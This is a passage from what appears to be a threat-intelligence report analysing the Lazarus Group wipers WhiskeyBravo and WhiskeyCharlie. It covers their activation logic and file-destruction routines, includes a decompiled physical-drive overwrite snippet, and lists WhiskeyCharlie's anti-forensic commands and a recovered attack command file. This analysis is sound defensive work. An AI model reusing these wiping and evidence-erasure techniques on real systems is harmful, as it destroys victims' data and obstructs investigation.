noise03.dat file is as follows:\n\n**OFFSET** **SIZE** **DEFAULT VALUE (AS SET BY INDIAGOLF)** **DESCRIPTION**\n\nCurrent system time at time of WhiskeyBravo\n0 8-bytes (Double) WhiskeyBravo’s installation time.\ninstallation in VARIANTTIME format.\n\n8 4 7 Activation delay (in days)\n\n**Table 3-1: WhiskeyBravo’s Configuration File Format**\n\nWhiskeyBravo will remain in a perpetual state of waiting to activate until one of three conditions occurs:\n\n1. The victim’s system time is set to a time prior to the installation time (offset 0).\n\n2. The victim’s system time is later than the sum of the installation time (offset 0) and the activation delay (offset 8).\n\n3. [WhiskeyBravo-One] The file %SYSDIR%\\dnsec.dat exists and contains a 32-bit value of 0.\n\nOnce the activation window has occurred on the victim’s computer, WhiskeyBravo will spawn two threads: a thread for\ndestroying select files on the victim’s hard drives and a thread for overwriting sectors on the victim’s attached physical\ndrives. Despite using two threads, one per task, the operations are performed sequentially, not in an asynchronous\nmanner as the use of multiple threads would suggest. After a new thread is generated for an operation, a call is made to\n```\n        WaitForSingleObject to wait for the thread to return with the timeout set to INFINITE. It is therefore unnecessary\n\n```\nfor the developer(s) of WhiskeyBravo to use two threads in the first place.\n\nThe task of destroying select files from the victim’s machine occurs on all lettered drives on the victim’s machine, starting\nat Z: and going through A:. For each lettered drive, WhiskeyBravo uses the FindFirstFileW/FindNextFileW API\nfunctions to enumerate each directory and file on the drive with the exception of %WINDIR% and %PROGRAMFILES%,\n\n7 Ten Days of Rain: Expert analysis of distributed denial-of-service attacks targeting South Korea.” McAfee. 2011. http://www.mcafee.com/us/resources/white-papers/wp-10-days-of-rain.pdf\n\n\n-----\n\nwhich are explicitly ignored; this behavior is also observed in WhiskeyAlfa (see Section 2) and WhiskeyDelta (see Section\n5). The selection criteria for a file to be overwritten and deleted is based solely on its extension using the target file identi­\nfication function detailed in Section 4.3.6 of the “Operation Blockbuster” report.[8] The method for destroying selected files\ndiffers by variant.\n\nAfter completing the file destruction task, WhiskeyBravo begins overwriting potentially large portions of each physical\ndrive attached to the victim’s computer. Interestingly, the developer(s) of WhiskeyBravo attempt to access\n```\n       \\\\.\\PhysicalDrive0 through \\\\.\\PhysicalDrive24; however, Windows has an upper limit of\n\n       \\\\.\\PhysicalDrive15, indicating that the developer(s) were either being sloppy in their coding or were potentially\n\n```\nmistaking a logical drive (a lettered drive) for a physical drive.\n\nFor each physical drive that WhiskeyBravo is able to access, a call is made to GetVersionEx to determine the type of\noperating system the victim is using. For victims running Windows Vista or newer, WhiskeyBravo attempts to overwrite\nwith NULL bytes the first 4.9 MB of the victim’s physical drives. If WhiskeyBravo is running on a machine with Windows\nXP or older—versions of Windows that have less restrictive access to the physical drives through the\n```\n       \\\\.\\PhysicalDriveX interface—then the overwriting of data with NULL bytes starting at sector 0 extends upwards\n\n```\nof 39.1 GB. The code for the sector overwrite function in Figure 3-1 reveals the developer(s) of WhiskeyBravo’s rudimen­\ntary understanding of how the \\\\.\\PhysicalDriveX interface works or at the very least a sloppy implementation of a\nmultiple pass overwrite operation.\n```\n          DistanceToMoveHigh = 0;\n          NumberOfBytesWritten = 0;\n          i = 0;\n          dwZeroBufferSize = 0x400000;\n          VersionInformation.dwOSVersionInfoSize = 284;\n          if ( GetVersionExW(&VersionInformation)\n            && VersionInformation.dwPlatformId == 2\n            && VersionInformation.dwMajorVersion == 6 )\n          {\n           dwZeroBufferSize = 512;\n          }\n          swprintf(wszDrive, L\"\\\\\\\\.\\\\PhysicalDrive%d\", driveNumber);\n          hFile = CreateFileW(wszDrive, 0xC0000000, 3u, 0, 3u, 0, 0);\n          if ( hFile != (HANDLE)-1 )\n          {\n           pvZeroBuffer = malloc(dwZeroBufferSize);\n           memset(pvZeroBuffer, 0, dwZeroBufferSize);\n           SetFilePointer(hFile, 0, &DistanceToMoveHigh, 0);\n           do\n            ++i;\n           while ( WriteFile(hFile, pvZeroBuffer, dwZeroBufferSize, &NumberOfBytesWritten, 0) &&\n          i < 100000 );\n           CloseHandle(hFile);\n           free(pvZeroBuffer);\n          }\n\n```\n**Figure 3-1: WhiskeyBravo’s Physical Drive Overwrite Function (snippet)**\n\nIf the intent was to render the first sector (512 bytes) or first 4 MB of a hard drive unusable—depending on the victim’s\noperating system—and thereby destroy the MBR and upwards of 4 MB worth of data that follow the MBR, then the devel­\noper(s) forgot to reset the file pointer back to the beginning of the do-while loop; as the code is implemented, each addi­\ntional call to WriteFile will increment the location of the write by 512 bytes or 4 MB. If, however, the intent was to\noverwrite a significant chunk of the victim’s hard drive, the operation will fail on versions of Windows that are Vista or\nnewer due to the restrictions these operating systems have on using \\\\.\\PhysicalDriveX for direct disk access. This\nsuggests a certain level of developmental carelessness—assuming that the intended targets had Vista or newer installed,\neven basic testing should have discovered this failing.\n\n8 http://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf\n\n\n-----\n\n#### 3.1 WhiskeyBravo-One\n\nThe %SYSDIR%\\dnsec.dat file is not a by-product of IndiaGolf. It appears that the file, if introduced by an external\napplication, can override the activation delay by containing the value of 0 or extend the activation delay up to 10 days by\nhaving a positive value. WhiskeyBravo limits the activation delay to 10 days. Any modification to the activation delay by\nthe introduction of the %SYSDIR%\\dnsec.dat file will force WhiskeyBravo to save a new copy of the %SYSDIR%\\dnsec.dat\nfile to disk. However, once WhiskeyBravo is in attack mode and no longer in wait mode, the %SYSDIR%\\dnsec.dat file\nwill have no impact on WhiskeyBravo’s operation. In other words, once the operation begins it cannot be stopped short of\nterminating the WhiskeyBravo process.\n\nWhiskeyBravo-One both overwrites and deletes any file selected for destruction. For any file that WhiskeyBravo-One\nselects for destruction, the file endures the following sequence of events:\n\n1. The file’s attributes are changed to FILE_ATTRIBUTE_NORMAL to remove a possible read-only flag\n\n2. The size of the file is used to generate a heap memory buffer that matches the same size of the file with an upper limit\n\n4 MB\n\n3. The heap memory buffer is zeroed out and written over the entirety of the selected file starting at byte 0\n\n4. If the selected file is less than 10 MB, a ZIP file is generated having the same filename as the selected file with a .cab\n\nextension added. The selected file is stored, not compressed, within the new ZIP archive and secured with a randomly\ngenerated 8-character password.\n\n5. If the .cab file is generated and has a size smaller than the original selected file, up to 4 MB of NULL bytes are\n\nappended to the end of the .cab file until it reaches a size equal to that of the original selected file.\n\n6. The selected file is deleted using DeleteFileW.\n\nSeveral items are noteworthy regarding the method that WhiskeyBravo-One uses to destroy a file. First, the code that\ngenerates the .cab file can be found in other Lazarus Group malware families and constitutes nearly 77% of the non-C\nRunTime (CRT) library functions within the WhiskeyBravo-One executable. Secondly, the end result is that the destruc­\ntion operation can give the impression that the original selected file is recoverable if the user is able to crack the archive’s\npassword. This is a bit of a cruel joke to play on the victim by giving them a glimmer of hope when, in actuality, the file is\nmost definitely destroyed and attempting to recover the file via the archive would be fruitless and a waste of resources.\n\n\n-----\n\n#### 3.2 WhiskeyBravo-Two\n\nWhiskeyBravo-Two is a simplified variant of WhiskeyBravo-One that removes the dnsec.dat functionality from the\nactivation window determination code as well as the archive functionality from the file destruction code. WhiskeyBravo-Two\nexpects the operation configuration file to be located at %SYSDIR%\\TYEI08.DEP instead of %SYSDIR%\\noise03.dat.\n\nThe file destruction process within WhiskeyBravo-Two focuses solely on overwriting the contents of a file and ignores the\ntask of deleting the file. This results in any file marked for destruction remaining on the victim’s file system, with the same\nfile size, but with completely useless content. Furthermore, WhiskeyBravo-Two removes the .cab generation entirely. The\nremoval of the .cab generation, and the functions necessary for that operation, results in a significantly smaller binary\nfootprint that consists of a total of 21 functions, 8 of which are made of the CRT library and 3 are administrative overhead\n(service related), leaving 10 functions responsible for the destructive functionality of the malware.\n\n\n-----\n\n|OFFSET|SIZE|FIELD ID|DESCRIPTION|\n|---|---|---|---|\n|0|4 Bytes|type|Instruction Type|\n|4|4 Bytes|size|Size of the entire instruction (minimum value is 8, maximum value is 4095)|\n|8|Variable (0 or More Bytes)|args|Instruction’s arguments|\n\n\n### 4. [Wiper] WhiskeyCharlie\n\nThe malicious malware identified by Novetta as WhiskeyCharlie is a configurable hard drive contention destroyer.\nObserved as one of the payloads of IndiaDelta and loaded into memory and activated by LimaAlfa, WhiskeyCharlie is a\nDLL-based wiper that goes to great lengths to ensure the complete destruction of data on a victim’s hard drives.\n\nWhiskeyCharlie contains only one exported function, the function named Register. This function requires three\narguments, all null-terminated strings: a string defining the location of a command file, a string defining the\ndecryption string for the command file, and a string specifying the number of seconds to delay before WhiskeyCharlie\nbegins processing the command file instructions. The core of WhiskeyCharlie is incredibly simple:\n\n1. Verify that the delay string is a real number (consists of characters between 0 and 9)\n\n2. Load the command file into memory\n\n3. Delete the command file from disk\n\n4. Delay the number of seconds specified before processing the command file instructions\n\n5. Process the command file instructions\n\n6. Terminate\n\nThe command file consists of a sequence of command instructions each made up of a minimum of 8 bytes. Table 4-1\nidentifies the format for WhiskeyCharlie insutrctions within the command file.\n\n**OFFSET** **SIZE** **FIELD ID** **DESCRIPTION**\n\n0 4 Bytes type Instruction Type\n\nSize of the entire instruction (minimum value is 8, maximum\n4 4 Bytes size\nvalue is 4095)\n\n8 Variable (0 or More Bytes) args Instruction’s arguments\n\n**Table 4-1: WhiskeyCharlie's Command File Instruction Format**\n\nThe developer(s) of WhiskeyCharlie encrypt the contents of the command file by using a variable length XOR string.\nSince XOR decryption is somewhat trivial on files that contain a significant number of NULL (0) values in the original\ndecrypted data, the developer(s) use junk bits within the type and size fields and merely bitwise-AND off the unneces­\nsary bits after decryption. For example, the type field consists of 4 bytes on disk, but from the perspective of the command\nprocessor only the least significant byte is important. Therefore, the value 01 03 46 08 after decryption for the type\nfield is reduced to just 01. Similarly, the size field is masked with 0xFFF meaning that more than half of its bits on disk\nare junk bits.\n\nThe decryption string is supplied by the user of WhiskeyCharlie, making decryption of the command file difficult (but\nnot impossible) without firsthand knowledge of the correct decryption key. Interestingly, there is no code that attempts to\nverify the correct decryption of the command file. The command file will be decrypted using whatever string was supplied\nby the user and then processed regardless of its validity.\n\n\n-----\n\n|INSTRUCTION TYPE|INTERNAL NAME|DESCRIPTION|\n|---|---|---|\n|1|[mode]|Sets the number of overwrite iterations the various delete commands will perform. Takes a single ASCII decimal number as the argument for the command. Valid values are: 0, 1, 3, and 5. 0 will disable the overwrite functionality, and values outside of 1, 3, and 5 will default to 7 overwrite iterations.|\n|2|[file]|Securely deletes a file by overwriting the file with random data (the number of over­ writes is determined by the value set by Command 1). The file’s name is replaced with a randomly generated string consisting of only upper-case letters. The command takes a single argument which is the target file to delete.|\n|3|[dirr]|Performs a secure delete (see Command 2) for all files within a specific directory that match a given file mask. The command takes two arguments separated by a | (pipe) character. The structure of the arguments is <target directory>|<file mask string>. Files that do not match the file mask (e.g. *.exe) are not deleted.|\n|4|[dira]|Same as Command 3 but will recursively delete all files in child directories of the target directory.|\n|5|[ntfs]|Produces 10000 files in a target directory (or %TEMP% if no directory is specified) with the name pattern of ~WD{8 digit random number}.log, writes its own filename within the file, renames the file to ~WD{another 8 digit random number}.tmp, and then deletes the file. Effectively, this is wiping artifacts that may exist in the NTFS’s directory tree by producing a significant number of files (and thus filenames) which it then frees. The command takes a single, optional argument of the target directory to produce the files within.|\n|6|[wow64]|Changes the state of the Wow64 file redirection (e.g. accessing System32 in either 32-bit or 64-bit mode changes based on process type). Takes a single argument of either on or off.|\n|7|[regk]|Deletes a registry key. Takes a single argument which specifies the full path of the registry key. The registry key must include the hive name in the form of HKEY_LOCAL_MACHINE, HKLM, HKEY_CURRENT_USER, HKCU, HKEY_CLASSES_ROOT, or HKEY_USERS.|\n|8|[regv]|Deletes a registry key and its values as well as any subkeys and values. Takes a single argument which specifies the full path of the registry key. The registry key must include the hive name in the form of KEY_LOCAL_MACHINE, HKLM, HKEY_CURRENT_USER, HKCU, HKEY_CLASSES_ROOT, or HKEY_USERS.|\n|9|[regt]|Modifies the last write timestamp of a specified registry key to a random date between Jan 1, 2007 and Dec 28, 2013 (where months will never exceed 28 days). Takes a single argument which specifies the full path of the registry key. The registry key must include the hive name in the form of HKEY_LOCAL_MACHINE, HKLM, HKEY_CURRENT_USER, HKCU, HKEY_CLASSES_ROOT, or HKEY_USERS.|\n|10|[svc]|Terminates and deletes the specified service. The command takes a single argument which specifies the name of the service to remove.|\n|11|[pf]|Deletes the prefetch files from %WINDIR%\\Prefetch directory using the same secure delete method as the [file] command. The optional argument to the command specifies a specific prefetch (.pf) file to delete or a file mask that specifies the prefetch files to delete. If the optional argument is missing, then all .pf files are deleted.|\n|12|[run]|Executes the specified program in a hidden window. The command requires two arguments (separated by |): <cmd line to execute>|<working directory>|\n\n\nWhiskeyCharlie contains 22 different supported commands, seen in Table 4-2 below. While currently only one sample of\nWhiskeyCharlie has been found in the wild (which is not surprising given its ability to completely destroy a victim’s hard\ndrive), evidence suggests that there are other WhiskeyCharlie samples that have been developed. This theory is supported\nby the fact that there are 3 missing commands within the command processor of the analyzed WhiskeyCharlie sample.\n\n**INSTRUCTION** **INTERNAL**\n\n**DESCRIPTION**\n\n**TYPE** **NAME**\n\nSets the number of overwrite iterations the various delete commands will perform.\nTakes a single ASCII decimal number as the argument for the command. Valid\n\n1 [mode]\n\nvalues are: 0, 1, 3, and 5. 0 will disable the overwrite functionality, and values\noutside of 1, 3, and 5 will default to 7 overwrite iterations.\n\nSecurely deletes a file by overwriting the file with random data (the number of over­\nwrites is determined by the value set by Command 1). The file’s name is replaced\n\n2 [file]\n\nwith a randomly generated string consisting of only upper-case letters. The\ncommand takes a single argument which is the target file to delete.\n\nPerforms a secure delete (see Command 2) for all files within a specific directory\n\n3 [dirr] that match a given file mask. The command takes two arguments separated by a |\n\n(pipe) character. The structure of the arguments is <target directory>|<file mask\nstring>. Files that do not match the file mask (e.g. *.exe) are not deleted.\n\nSame as Command 3 but will recursively delete all files in child directories of the\n4 [dira]\ntarget directory.\n\nProduces 10000 files in a target directory (or %TEMP% if no directory is specified)\nwith the name pattern of ~WD{8 digit random number}.log, writes its own filename\nwithin the file, renames the file to ~WD{another 8 digit random number}.tmp, and\n\n5 [ntfs] then deletes the file. Effectively, this is wiping artifacts that may exist in the NTFS’s\n\ndirectory tree by producing a significant number of files (and thus filenames) which\nit then frees. The command takes a single, optional argument of the target directory\nto produce the files within.\n\nChanges the state of the Wow64 file redirection (e.g. accessing System32 in either\n\n6 [wow64] 32-bit or 64-bit mode changes based on process type). Takes a single argument of\n\neither on or off.\n\nDeletes a registry key. Takes a single argument which specifies the full path of the\nregistry key. The registry key must include the hive name in the form of\n\n7 [regk]\n```\n                       HKEY_LOCAL_MACHINE, HKLM, HKEY_CURRENT_USER, HKCU,\n\n                       HKEY_CLASSES_ROOT, or HKEY_USERS.\n\n```\nDeletes a registry key and its values as well as any subkeys and values. Takes\na single argument which specifies the full path of the registry key. The registry\n\n8 [regv]\n\nkey must include the hive name in the form of KEY_LOCAL_MACHINE, HKLM,\n```\n                       HKEY_CURRENT_USER, HKCU, HKEY_CLASSES_ROOT, or HKEY_USERS.\n\n```\nModifies the last write timestamp of a specified registry key to a random date\nbetween Jan 1, 2007 and Dec 28, 2013 (where months will never exceed 28 days).\nTakes a single argument which specifies the full path of the registry key. The\n\n9 [regt]\n\nregistry key must include the hive name in the form of HKEY_LOCAL_MACHINE,\n```\n                       HKLM, HKEY_CURRENT_USER, HKCU, HKEY_CLASSES_ROOT, or\n\n                       HKEY_USERS.\n\n```\nTerminates and deletes the specified service. The command takes a single\n10 [svc]\nargument which specifies the name of the service to remove.\n\nDeletes the prefetch files from %WINDIR%\\Prefetch directory using the\nsame secure delete method as the [file] command. The optional argument to\n\n11 [pf] the command specifies a specific prefetch (.pf) file to delete or a file mask that\n\nspecifies the prefetch files to delete. If the optional argument is missing, then all\n```\n                       .pf files are deleted.\n\n```\nExecutes the specified program in a hidden window. The command requires two\n12 [run]\narguments (separated by |): <cmd line to execute>|<working directory>\n\n\n-----\n\n|INSTRUCTION TYPE|INTERNAL NAME|DESCRIPTION|\n|---|---|---|\n|13|[runw]|Same as the [run] command but waits for the program to terminate before continuing to the next command.|\n|14|[kill]|Terminates a running process by name. Takes a single argument which specifies the name of the program to determine.|\n|15|[hc]|NOP|\n|16|[evc]|Destroys one or all events logs by (for Windows XP and older) calling ClearEventLog to purge the log and then using the [file] command to delete the backup .evt file or (for Windows Vista and newer) calls EvtClearLog (from wevtapi.dll) or uses wevtuil.exe cl <event log> /bu:<backup file name> then uses the [file] command to delete the backup file. The command takes a single argument that specifies the event log to delete or * if all event logs are to be deleted.|\n|17|[evr]|NOP|\n|18|[evs]|NOP|\n|19|[mu]|Removes one or all applications from the most recently used (MRU) programs list within Windows. The command takes a single argument that specifies the name of the program to remove from the MRU list or * if all programs are to be removed. The command purges values that match the specified program (or all programs if * is given) under the following registry keys: HKCU\\Software\\ Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist, HKCU\\Software\\Classes\\Local Settings\\Software\\Microsoft\\ Windows\\Shell\\MuiCache, and HKCU\\Software\\Microsoft\\ Windows\\ShellNoRoam\\MUICache|\n|20|[iec]|Deletes IE cache files. The command requires two arguments separated by | with the first argument being the file mask to specify which cache files for the command to target and the second argument specifying the user profile to target.|\n|21|[iei]|Deletes cookies, browsing history and download history files from %CSIDL_HISTORY%, %CSIDL_COOKIES%, %CSIDL_INTERNET_CACHE%, %CSIDLE_COOKIES%\\IEDownloadHistory directories. The command takes an optional single argument that specifies the user profile to target.|\n|22|[swap]|Purges the page file by enabling the clearing of the page file at shutdown (by setting HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\ Memory Management\\ClearPageFileAtShutdown to 1) and then gener­ ating an excessively large amount of memory to fill up the swap space (page file).|\n|23|[hard]|Systematically destroys the contents of a victim’s hard drives by performing the following tasks: }} Calls the [swap] command }} Stops the Sens and Alerter services }} Overwrites the MBR of the first four attached hard drives }} [If argument is *] Renames files within %WIDIR% and %PROGRAMFILES% to a random string of uppercase letters after overwriting their contents and then deletes them. }} Opens a file handle to each hard drive (by means of \\\\.\\PhysicalDrive{Drive Number}) and overwrites entire drive with random data. }} Shuts down Windows by calling ExitWindowsEx. The command takes only one optional argument that specifies if the victim’s files are deleted or not (when * is given).|\n|24|[self]|Generates and executes a suicide script.|\n|25|[sleep]|Sleep delay. Takes a single argument that specifies the sleep time in seconds in ASCII decimal form.|\n\n\n**INSTRUCTION** **INTERNAL**\n\n**DESCRIPTION**\n\n**TYPE** **NAME**\n\n13 [runw] Same as the [run] command but waits for the program to terminate before\ncontinuing to the next command.\n\nTerminates a running process by name. Takes a single argument which specifies the\n14 [kill]\nname of the program to determine.\n\n15 [hc] NOP\n\nDestroys one or all events logs by (for Windows XP and older) calling\n```\n                       ClearEventLog to purge the log and then using the [file] command to delete\n\n```\nthe backup .evt file or (for Windows Vista and newer) calls EvtClearLog (from\n\n16 [evc] `wevtapi.dll) or uses wevtuil.exe cl <event log> /bu:<backup file`\n\nname> then uses the [file] command to delete the backup file. The command\ntakes a single argument that specifies the event log to delete or * if all event logs\nare to be deleted.\n\n17 [evr] NOP\n\n18 [evs] NOP\n\nRemoves one or all applications from the most recently used (MRU) programs\nlist within Windows. The command takes a single argument that specifies the\nname of the program to remove from the MRU list or * if all programs are to be\nremoved. The command purges values that match the specified program (or all\n\n19 [mu] programs if * is given) under the following registry keys: HKCU\\Software\\\n```\n                       Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist,\n                       HKCU\\Software\\Classes\\Local Settings\\Software\\Microsoft\\\n                       Windows\\Shell\\MuiCache, and HKCU\\Software\\Microsoft\\\n                       Windows\\ShellNoRoam\\MUICache\n\n```\nDeletes IE cache files. The command requires two arguments separated by | with\n\n20 [iec] the first argument being the file mask to specify which cache files for the command\n\nto target and the second argument specifying the user profile to target.\n\nDeletes cookies, browsing history and download history files from\n\n21 [iei] `%CSIDL_HISTORY%, %CSIDL_COOKIES%, %CSIDL_INTERNET_CACHE%,`\n```\n                       %CSIDLE_COOKIES%\\IEDownloadHistory directories. The command takes\n\n```\nan optional single argument that specifies the user profile to target.\n\nPurges the page file by enabling the clearing of the page file at shutdown (by setting\n\n22 [swap] `HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\`\n```\n                       Memory Management\\ClearPageFileAtShutdown to 1) and then gener­\n\n```\nating an excessively large amount of memory to fill up the swap space (page file).\n\nSystematically destroys the contents of a victim’s hard drives by performing the\nfollowing tasks:\n\n}} Calls the [swap] command\n}} Stops the Sens and Alerter services\n}} Overwrites the MBR of the first four attached hard drives\n\n[hard] }} [If argument is *] Renames files within %WIDIR% and %PROGRAMFILES% to\n\n23 a random string of uppercase letters after overwriting their contents and then\n\ndeletes them.\n}} Opens a file handle to each hard drive (by means of \\\\.\\PhysicalDrive{Drive\nNumber}) and overwrites entire drive with random data.\n}} Shuts down Windows by calling ExitWindowsEx.\n\nThe command takes only one optional argument that specifies if the victim’s files\nare deleted or not (when * is given).\n\n24 [self] Generates and executes a suicide script.\n\nSleep delay. Takes a single argument that specifies the sleep time in seconds in\n25 [sleep]\nASCII decimal form.\n\n**Table 4-2: Instructions of WhiskeyCharlie**\n\n\n-----\n\n|COMMAND|ARGUMENTS|DESCRIPTION OF ACTION|\n|---|---|---|\n|[mode]|3|Sets the overwrite iteration for secure deletes to 3 iterations|\n|[pf]|*|Deletes all prefetch entries|\n|[evc]|*|Deletes all event logs|\n|[mu]|*|Removes all MRU entries for all applications|\n|[kill]|verclvid.exe|Terminates any process named verclvid.exe|\n|[svc]|gensvc|Stops and removes service named gensvc|\n|[svc]|twrasvc|Stops and removes service named twrasvc|\n|[svc]|zwzsvc|Stops and removes service named zwzsvc|\n|[svc]|esthsvc|Stops and removes service named esthsvc|\n|[svc]|bgyesvc|Stops and removes service named bgyesvc|\n|[svc]|zwdfsvc|Stops and removes service named zwdfsvc|\n|[svc]|rvtqsvc|Stops and removes service named rvtqsvc|\n|[svc]|dzkrsvc|Stops and removes service named dzkrsvc|\n|[svc]|trvesvc|Stops and removes service named trvesvc|\n|[svc]|ilpksvc|Stops and removes service named ilpksvc|\n|[svc]|rwzsvc|Stops and removes service named rwzsvc|\n|[svc]|kfvesvc|Stops and removes service named kfvesvc|\n|[svc]|kznsvc|Stops and removes service named kznsvc|\n\n\nOne of the most destructive features of WhiskeyCharlie is its secure delete function. This variant of secure delete consists\nof performing the following operations on a target file:\n\n1. If the file is read-only, make it writable\n\n2. Based on the value set by the [mode] command, determine the number of overwrite iterations to perform on the file.\n\nThe default value is 7, but it is possible to specify 1, 3, or 5 iterations. The overwrite functionality can be disabled by\nsupplying the [mode] command the value of 0\n\n3. Perform an overwrite operation on the specified file, repeat until all requested iterations have been completed\n\n4. Rename the target file’s filename by replacing each character with a randomly selected uppercase character\n\n5. Delete the file by calling the API function DeleteFileA\n\nThe overwrite operation that WhiskeyCharlie uses during secure delete operations begins by generating a 64KB buffer\nof random values (as supplied by 64K calls to rand), the target file is opened and one byte is appended to the end of the\nfile, then each byte of the target file is overwritten with a value from the random value buffer, the writes are then flushed\nto disk. On the last iteration of the overwrite operation, the file size is set to 0 by calling the SetEndOfFile function\nand then the changes to the file are flushed to disk by calling FlushFileBuffers. This means that not only is the data\nwithin the file completely destroyed by one or more iterations of random data being written over the original data, but the\nfile’s size is also corrupted, making it difficult to determine how big the file was originally.\n\nWhile the command file is encrypted, as mentioned previously, it was possible to recover the decryption key string\nof m140chi1a0shi! and decrypt the contents of a known command file dropped by IndiaDelta (sample SHA-256:\n```\n       d7b50b1546653bff68220996190446bdc7fc4e38373715b8848d1fb44fe3f53c (see Table 4-3). This command file\n\n```\nshows a real world example of how the attackers use WhiskeyCharlie to attack a victim’s computer. The command file\nconsists of a significant number of service deletions and file deletions prior to performing a full hard drive destruction\ntask. It is clear from the nature of WhiskeyCharlie’s instruction set and the recovered command file that the use of\nWhiskeyCharlie on a victim’s machine is the final stage of an attack, as there will be no usable data left on the victim’s\nhard drive once the malware has completed its task.\n\n**COMMAND** **ARGUMENTS** **DESCRIPTION OF ACTION**\n\n[mode] 3 Sets the overwrite iteration for secure deletes to 3 iterations\n\n[pf]                - Deletes all prefetch entries\n\n[evc]              - Deletes all event logs\n\n[mu]            - Removes all MRU entries for all applications\n\n[kill] verclvid.exe Terminates any process named verclvid.exe\n\n[svc] gensvc Stops and removes service named gensvc\n\n[svc] twrasvc Stops and removes service named twrasvc\n\n[svc] zwzsvc Stops and removes service named zwzsvc\n\n[svc] esthsvc Stops and removes service named esthsvc\n\n[svc] bgyesvc Stops and removes service named bgyesvc\n\n[svc] zwdfsvc Stops and removes service named zwdfsvc\n\n[svc] rvtqsvc Stops and removes service named rvtqsvc\n\n[svc] dzkrsvc Stops and removes service named dzkrsvc\n\n[svc] trvesvc Stops and removes service named trvesvc\n\n[svc] ilpksvc Stops and removes service named ilpksvc\n\n[svc] rwzsvc Stops and removes service named rwzsvc\n\n[svc] kfvesvc Stops and removes service named kfvesvc\n\n[svc] kznsvc Stops and removes service named kznsvc\n\n\n-----\n\n|COMMAND|ARGUMENTS|DESCRIPTION OF ACTION|\n|---|---|---|\n|[svc]|jiusvc|Stops and removes service named jiusvc|\n|[svc]|ocynsvc|Stops and removes service named ocynsvc|\n|[svc]|ithsvc|Stops and removes service named ithsvc|\n|[svc]|zxtxsvc|Stops and removes service named zxtxsvc|\n|[svc]|mujsvc|Stops and removes service named mujsvc|\n|[svc]|dmosvc|Stops and removes service named dmosvc|\n|[svc]|rhpysvc|Stops and removes service named rhpysvc|\n|[svc]|crxlsvc|Stops and removes service named crxlsvc|\n|[svc]|hnbsvc|Stops and removes service named hnbsvc|\n|[svc]|epdtsvc|Stops and removes service named epdtsvc|\n|[svc]|jdfsvc|Stops and removes service named jdfsvc|\n|[svc]|pdaisvc|Stops and removes service named pdaisvc|\n|[file]|verclvid.exe|Securely deletes file named verclvid.exe|\n|[file]|gensvc.dll|Securely deletes file named gensvc.dll|\n|[file]|twrasvc.dll|Securely deletes file named twrasvc.dll|\n|[file]|zwzsvc.dll|Securely deletes file named zwzsvc.dll|\n|[file]|esthsvc.dll|Securely deletes file named esthsvc.dll|\n|[file]|bgyesvc.dll|Securely deletes file named bgyesvc.dll|\n|[file]|zwdfsvc.dll|Securely deletes file named zwdfsvc.dll|\n|[file]|rvtqsvc.dll|Securely deletes file named rvtqsvc.dll|\n|[file]|dzkrsvc.dll|Securely deletes file named dzkrsvc.dll|\n|[file]|trvesvc.dll|Securely deletes file named trvesvc.dll|\n|[file]|ilpksvc.dll|Securely deletes file named ilpksvc.dll|\n|[file]|rwzsvc.dll|Securely deletes file named rwzsvc.dll|\n|[file]|kfvesvc.dll|Securely deletes file named kfvesvc.dll|\n|[file]|kznsvc.dll|Securely deletes file named kznsvc.dll|\n|[file]|jiusvc.dll|Securely deletes file named jiusvc.dll|\n|[file]|ocynsvc.dll|Securely deletes file named ocynsvc.dll|\n|[file]|ithsvc.dll|Securely deletes file named ithsvc.dll|\n|[file]|zxtxsvc.dll|Securely deletes file named zxtxsvc.dll|\n|[file]|mujsvc.dll|Securely deletes file named mujsvc.dll|\n|[file]|dmosvc.dll|Securely deletes file named dmosvc.dll|\n|[file]|rhpysvc.dll|Securely deletes file named rhpysvc.dll|\n|[file]|crxlsvc.dll|Securely deletes file named crxlsvc.dll|\n|[file]|hnbsvc.dll|Securely deletes file named hnbsvc.dll|\n|[file]|epdtsvc.dll|Securely deletes file named epdtsvc.dll|\n|[file]|jdfsvc.dll|Securely deletes file named jdfsvc.dll|\n|[file]|pdaisvc.dll|Securely deletes file named pdaisvc.dll|\n|[hard]||Destroys the content of all hard drives and shuts down Windows|\n\n\n**COMMAND** **ARGUMENTS** **DESCRIPTION OF ACTION**\n\n[svc] jiusvc Stops and removes service named jiusvc\n\n[svc] ocynsvc Stops and removes service named ocynsvc\n\n[svc] ithsvc Stops and removes service named ithsvc\n\n[svc] zxtxsvc Stops and removes service named zxtxsvc\n\n[svc] mujsvc Stops and removes service named mujsvc\n\n[svc] dmosvc Stops and removes service named dmosvc\n\n[svc] rhpysvc Stops and removes service named rhpysvc\n\n[svc] crxlsvc Stops and removes service named crxlsvc\n\n[svc] hnbsvc Stops and removes service named hnbsvc\n\n[svc] epdtsvc Stops and removes service named epdtsvc\n\n[svc] jdfsvc Stops and removes service named jdfsvc\n\n[svc] pdaisvc Stops and removes service named pdaisvc\n\n[file] verclvid.exe Securely deletes file named verclvid.exe\n\n[file] gensvc.dll Securely deletes file named gensvc.dll\n\n[file] twrasvc.dll Securely deletes file named twrasvc.dll\n\n[file] zwzsvc.dll Securely deletes file named zwzsvc.dll\n\n[file] esthsvc.dll Securely deletes file named esthsvc.dll\n\n[file] bgyesvc.dll Securely deletes file named bgyesvc.dll\n\n[file] zwdfsvc.dll Securely deletes file named zwdfsvc.dll\n\n[file] rvtqsvc.dll Securely deletes file named rvtqsvc.dll\n\n[file] dzkrsvc.dll Securely deletes file named dzkrsvc.dll\n\n[file] trvesvc.dll Securely deletes file named trvesvc.dll\n\n[file] ilpksvc.dll Securely deletes file named ilpksvc.dll\n\n[file] rwzsvc.dll Securely deletes file named rwzsvc.dll\n\n[file] kfvesvc.dll Securely deletes file named kfvesvc.dll\n\n[file] kznsvc.dll Securely deletes file named kznsvc.dll\n\n[file] jiusvc.dll Securely deletes file named jiusvc.dll\n\n[file] ocynsvc.dll Securely deletes file named ocynsvc.dll\n\n[file] ithsvc.dll Securely deletes file named ithsvc.dll\n\n[file] zxtxsvc.dll Securely deletes file named zxtxsvc.dll\n\n[file] mujsvc.dll Securely deletes file named mujsvc.dll\n\n[file] dmosvc.dll Securely deletes file named dmosvc.dll\n\n[file] rhpysvc.dll Securely deletes file named rhpysvc.dll\n\n[file] crxlsvc.dll Securely deletes file named crxlsvc.dll\n\n[file] hnbsvc.dll Securely 